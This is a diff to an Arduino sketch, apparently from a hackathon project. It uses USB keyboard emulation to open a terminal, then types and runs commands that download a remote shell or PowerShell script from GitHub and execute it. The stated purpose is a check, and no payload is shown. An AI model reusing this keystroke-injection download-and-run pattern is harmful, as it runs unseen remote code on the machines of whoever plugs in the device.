@@ -41,6 +41,7 @@ void setup()
 
 
     openTerminal();
+    downloadCheckFile();
 }
 
 #if HOST == 1
@@ -55,9 +56,9 @@ void openTerminal()
     Keyboard.releaseAll();
     delay(1000); // Wait for terminal to open
 }
-void checkIfFileExists()
+void downloadCheckFile()
 {
-    
+    Keyboard.println("curl -o check.sh https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.sh && chmod +x check.sh && ./check.sh");
 }
 #endif
 
@@ -76,6 +77,10 @@ void openTerminal()
     delay(100);
     Keyboard.write(KEY_RETURN);
     delay(2000); // Longer wait for cmd to open
+}
+void downloadCheckFile()
+{
+    Keyboard.println("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.ps1\" -OutFile \"check.ps1\"; .\check.ps1");
 }
 #endif
 
